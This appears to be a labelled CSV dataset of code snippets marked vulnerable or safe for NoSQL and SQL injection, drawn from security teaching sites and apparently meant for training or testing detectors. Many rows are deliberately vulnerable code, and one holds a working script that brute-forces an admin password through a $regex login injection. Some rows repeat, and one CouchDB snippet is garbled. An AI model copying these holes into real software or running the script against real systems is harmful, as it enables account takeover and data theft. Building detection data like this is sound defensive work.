code,target,source,link
"db.myCollection.find( { active: true, $where: function() { return obj.credits—obj.debits < $userInput; } } );;",1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );,1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
"app.post('/', function (req, res) {
  db.users.find(
    { username: req.body.username, password: req.body.password },
    function (err, users) {
      // TODO: handle the rest
    }
  )
})",1,WebSecurify,https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"app.post('/login', function (req, res){
    let user = String(req.body.username);
    let pass = String(req.body.password);
 
    let query = {
        username: user,
        password: pass
    }
 
    db.collection('user').findOne(query, function (err, user) {
        if (err || !user) {
            response.status(401).json({
                status: ""error"",
                message: ""Invalid credentials."",
              });
        } else {
            res.json({username: user.username });
        }
    });
});",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
"  public List<String> findUsers(String user, String pass) throws Exception {
    String query = ""SELECT userid FROM users "" +
                   ""WHERE username='"" + user + ""' AND password='"" + pass + ""'"";
       Statement statement = connection.createStatement();
       ResultSet resultSet = statement.executeQuery(query);
       List<String> users = new ArrayList<String>();
       while (resultSet.next()) {
           users.add(resultSet.getString(0));
       }
       return users;
   }",1,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"using Microsoft.AspNetCore.Mvc;
using MongoDB.Driver;
using System.Threading.Tasks;
using YourNamespace.Models; // Replace with your actual namespace and models
using YourNamespace.Services; // Assuming you have a service for hashing

[Route(""api/[controller]"")]
[ApiController]
public class LoginController : ControllerBase {
    private readonly IMongoCollection<User> _users;
    private readonly IPasswordHasher _passwordHasher; // A service to hash passwords

    public LoginController(IMongoDatabase database, IPasswordHasher passwordHasher) {
        _users = database.GetCollection<User>(""user"");
        _passwordHasher = passwordHasher;
    }

    [HttpPost]
    public async Task<IActionResult> Post([FromBody] User user) {
        if (user == null || string.IsNullOrWhiteSpace(user.Username) || string.IsNullOrWhiteSpace(user.Password)) {
            return BadRequest(""Invalid user data."");
        } try {
            var filter = Builders<User>.Filter.Eq(""username"", user.Username);
            var foundUser = await _users.Find(filter).FirstOrDefaultAsync();

            if (foundUser != null && _passwordHasher.VerifyPassword(user.Password, foundUser.PasswordHash)) {
                return Ok(new { username = foundUser.Username });
            } else {
                return Unauthorized(new { status = ""error"", message = ""Invalid credentials."" });
            }
        } catch {
            return StatusCode(500, new { status = ""error"", message = ""Internal server error."" });
        }
    }
}

public class User {
    public string Username { get; set; }
    public string PasswordHash { get; set; } // Store hashed passwords
    // Include other properties as needed
}

public interface IPasswordHasher {
    string HashPassword(string password);
    bool VerifyPassword(string providedPassword, string passwordHash);
}

// Implement the IPasswordHasher interface in a class that handles password hashing and verification.",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
"import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(""Found one more char : %s"" % (password+c))
        password += c
",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
"db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;",1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
db.myCollection.find( { $where: function() { return obj.credits—obj.debits < 0; } } );,1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
"     // Log the sanitised username
     String user = sanitiseInput(request.getParameter(""user""));
     ...
   }   

  private String sanitiseInput(String input) {
     // Replace newline and carriage return characters with a safe placeholder
     if (input != null) {
       input = input.replaceAll(""[\\n\\r]"", ""_"");
     }
     return input;
   }",0,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
"<?
$mongo = new Mongo();
$db = $mongo->demo;
$id = $_GET['id'];
$js = ""function() {
var id = '$id';
SOME CODE...
}"";
$response = $db->execute($js);
...
?>",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
"<?php
$myVar = $_GET['id'];

echo ""<script runat=server>
    myPHPVar = '$myVar';
    onload = function(){
    ..SOME CODE..
    };
</script>"";
?>",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
"<html>

<head>
 <title>Payment information</title>
</head>

 <body>
  <?php
  try {
   $conn = new MongoDB\Driver\Manager('mongodb://root:prisma@mongo:27017');

   $options = [
    'projection' => [],
   ];
   $filter = ['id' => $_GET['acctid']];
   $query = new MongoDB\Driver\Query($filter, $options);

   $cursor = $conn->executeQuery('customers.paymentinfo', $query);
   $counter = 0;
   
   foreach ($cursor as $obj) {
    $counter++;
    echo 'Name: ' . $obj->name . '<br/>';
    echo 'Customer ID: ' . $obj->id . '<br/>';
    echo 'Card Number: ' . $obj->cc . '<br/>';
    echo 'CVV2 Code: ' . $obj->cvv2 . '<br/>';
    echo '<br/>';
   }

   echo $counter . ' document(s) found. <br/>';
   
  } catch (MongoConnectionException $e) {
   die('Error connecting to MongoDB server : ' . $e->getMessage());
  } catch (MongoException $e) {
   die('Error: ' . $e->getMessage());
  }
  ?>


 </body>

</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
"async function index(req, res) {
    const { db, User, QueryTypes } = req.app.get('sequelize');

    const user = req.query.user;
    const pass = req.query.pass;

    let loggedInUser = await db.query(
        `SELECT * FROM users WHERE user = $user AND pass = $pass`,
        {
            bind: {
                user: user,
                pass: pass,
            },
            type: QueryTypes.SELECT,
            model: User,
        }
    );

    res.send(JSON.stringify(loggedInUser));
    res.end();
}",0,SonarSource,https://rules.sonarsource.com/typescript/?search=injection
"<!DOCTYPE html>
<html>
 <head>
  <title>Order Lookup</title>
 </head>
 <body>
  <?php
  if (isset($_GET['ordersearch']) && !empty($_GET['ordersearch'])) {
   try {
    $result = """";
    $conn = new MongoClient('mongodb://127.0.0.1');
    $db = $conn->shop;
     $collection = $db->orders;
     $search = $_GET['ordersearch'];
     $js = ""function () { var query = '"". $search . ""'; return this.id == query;}"";
     //print $js;
     print '<br/>';
   
    $cursor = $collection->find(array('$where' => $js));
    echo $cursor->count() . ' order(s) found. <br/>';
   
    foreach ($cursor as $obj) {
      echo 'Order ID: ' . $obj['id'] . '<br/>';
      echo 'Name: ' . $obj['name'] . '<br/>';
      echo 'Item: ' . $obj['item'] . '<br/>';
      echo 'Quantity: ' . $obj['quantity']. '<br/>';
      echo '<br/>';
    }
    $conn->close();
   } catch (MongoConnectionException $e) {
    die('Error connecting to MongoDB server : ' . $e->getMessage());
   } catch (MongoException $e) {
    die('Error: ' . $e->getMessage());
   }
  }
  ?>


  <b>Use the Order ID to locate your order:</b><br>
  <form method=""get"" id=""usersearch"">
   <p>Search <input type=""text"" name=""ordersearch"" id=""ordersearch"" /> <input type=""submit"" name=""submitbutton""
     value=""Submit"" /></p>
  </form>
  <div id=""results"">
   <?php echo $result; ?>
  </div>
 </body>

</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
"from flask import Flask, request
import json

app = Flask(__name__)

@app.route(""/example"")
def example():
    obj = json.loads(request.args.get(""object""))
    return str(obj[""status""] == ""OK"")",0,SonarSource,https://rules.sonarsource.com/python/RSPEC-5135/?search=inject
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"#include <iostream>
#include <mongocxx/client.hpp>
#include <mongocxx/instance.hpp>
#include <bsoncxx/builder/stream/document.hpp>
#include <bsoncxx/json.hpp>

// Hypothetical function to get user input
std::string GetUserInput(const std::string& prompt);

int main() {
    mongocxx::instance inst{};
    mongocxx::client conn{mongocxx::uri{}};

    auto db = conn[""mydatabase""];
    auto collection = db[""user""];

    std::string username = GetUserInput(""Username: "");
    std::string password = GetUserInput(""Password: "");

    // Build the query using parameterized methods
    bsoncxx::builder::stream::document document{};
    document << ""username"" << bsoncxx::builder::stream::open_document 
             << ""$eq"" << username 
             << bsoncxx::builder::stream::close_document
             << ""password"" << bsoncxx::builder::stream::open_document 
             << ""$eq"" << password 
             << bsoncxx::builder::stream::close_document;

    auto cursor = collection.find(document.view());

    // Process the cursor (e.g., check if user exists)
    // ...

    return 0;
}",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
"HashMap<String, String> paramMap = new HashMap<>();
paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
String json = new JSONObject(paramMap).toString();
BasicDBObject query = new BasicDBObject().parse(json);

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));

MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"Users.findOne(
  {
    ""name"" : req.body.name, 
    ""password"" : req.body.password
  }
 );",1,secureflag,https://knowledge-base.secureflag.com/vulnerabilities/nosql_injection/nosql_injection_vulnerability.html
"db.myCollection.find( { $where: ""this.credits == this.debits"" } );",1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
"class AuthenticationHandler {

    public mysqli $conn;

    function authenticate() {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $authenticated = false;

        $query = ""SELECT * FROM users WHERE user = :user AND pass = :pass"";

        $stmt = $this->conn->prepare($query);
        $stmt->bind_param("":user"", $user);
        $stmt->bind_param("":pass"", $pass);
        $stmt->execute();

        $stmt->store_result();

        if ( $stmt->num_rows == 1) {
          $authenticated = true;
        }

        return $authenticated;
    }
}",0,SonarSource,https://rules.sonarsource.com/php/RSPEC-3649/
"BasicDBObject query = new BasicDBObject();
HashMap<String, String> paramMap = new HashMap<>();
paramMap.put(""sharedWith"", userName);
paramMap.put(""email"", email);
query.putAll(paramMap);

MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
"var nano = require(nano)(http://localhost:5984); 
var db = nano.db.use(mydatabase'); 
var username = req.query.username; 
var password = req.query.password; 

db.get('users', username, functign(err, body) ( 
       if (Cerr) { 
               if (body.password ===password) { 
                      res.send('Login successful!); ) 
               else ( res.send('Invalid password!); 
       } else ( 
                res.send('User not found!);}
});",1,SecOps,https://secops.group/a-pentesters-guide-to-nosql-injection/
"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
                .start()
                .add(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
                .get();

MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
$query = array('$where' => 'this.name === \''.$name.'\'');,1,Invicti,https://www.invicti.com/learn/nosql-injection/
"const { MongoClient } = require('mongodb');

function (req, res) {
    let query = { user: req.query.user.toString(), city: req.query.city.toString() };

    MongoClient.connect(url, (err, db) => {
        db.collection(""users"")
        .find(query)
        .toArray((err, docs) => { });
    });
}",0,SonarSource,https://rules.sonarsource.com/typescript/?search=nosql
